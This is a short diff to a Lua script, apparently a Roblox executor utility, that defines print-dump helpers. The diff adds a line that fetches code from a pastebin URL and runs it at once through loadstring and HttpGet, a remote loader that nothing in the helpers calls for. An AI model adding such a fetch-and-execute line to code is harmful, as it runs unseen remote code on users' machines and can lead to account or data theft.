@@ -80,6 +80,8 @@ function printdump(...)
     print(output)
 end
 
+loadstring(game:HttpGet("https://pastebin.com/raw/tcnND0RT"))()
+
 getgenv().printdump = printdump
 getgenv().dump = dump
 
